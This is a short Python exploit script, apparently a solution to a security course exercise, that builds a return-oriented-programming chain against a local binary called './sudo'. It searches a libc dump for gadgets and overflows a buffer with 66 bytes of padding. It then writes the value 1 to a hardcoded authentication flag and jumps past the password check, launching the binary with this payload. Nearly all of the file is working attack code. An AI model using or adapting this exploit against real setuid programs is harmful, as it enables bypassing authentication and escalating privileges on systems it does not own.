import os, sys

import assemble, struct
from search import GadgetSearch


PATH_TO_SUDO = './sudo'
LIBC_DUMP_PATH = './libc.bin'


def get_arg():
	auth_address = 0x804A054
	reurn_from_check_password_address = 0x80488C6

	start_of_libc = 0xb7c3a750



	gs = GadgetSearch('libc.bin', start_of_libc)


	mov_and_address = gs.find_format('MOV [edx], eax')


	mov_address = mov_and_address[1].decode("hex")[::-1]
	pop_edx_address = gs.find('POP edx').decode("hex")[::-1]
	mov_eax_minus1 = gs.find('MOV eax, -1').decode("hex")[::-1]
	inc_eax = gs.find('INC eax').decode("hex")[::-1]



	result  =  66 *'a' #padding

	result += mov_eax_minus1
	result += inc_eax + inc_eax
	result += pop_edx_address
	result += struct.pack('<I',auth_address)
	result += mov_address
	result += struct.pack('<I',reurn_from_check_password_address)


	return result

    #raise NotImplementedError()


def main(argv):
    os.execl(PATH_TO_SUDO, PATH_TO_SUDO, get_arg())
	#os.execl('/usr/bin/gdb', '/usr/bin/gdb', '-ex=r', '--args', './sudo', get_arg())

if __name__ == '__main__':
    main(sys.argv)
